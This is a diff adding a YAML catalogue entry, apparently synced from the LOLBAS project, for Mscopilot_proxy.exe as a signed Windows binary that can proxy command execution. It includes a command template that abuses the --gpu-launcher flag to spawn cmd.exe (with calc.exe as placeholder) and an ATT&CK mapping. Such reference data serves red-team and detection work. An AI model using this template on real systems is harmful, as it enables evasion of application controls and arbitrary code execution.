@@ -1,0 +1,31 @@
+id: lolbas/mscopilot-proxy/execute/0
+type: binary
+platform: windows
+name: Mscopilot_proxy.exe
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0 (verify upstream LICENSE)
+  upstream_version: 9c5e384
+  last_synced: '2026-08-25'
+aliases:
+- mscopilot_proxy
+attack_techniques:
+- T1218.015
+opsec:
+  noise: high
+commands:
+- template: mscopilot_proxy.exe --no-startup-window --disable-gpu-sandbox --gpu-launcher="cmd.exe /c calc.exe
+    && taskkill /f /im mscopilot.exe &&"
+  comment: '`mscopilot_proxy.exe` will spawn the provided command. Parent `mscopilot_proxy.exe` process
+    needs to be killed to avoid command being executed an infinite number of times.'
+references:
+- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Mscopilot_proxy/
+tags:
+- windows
+- lolbas
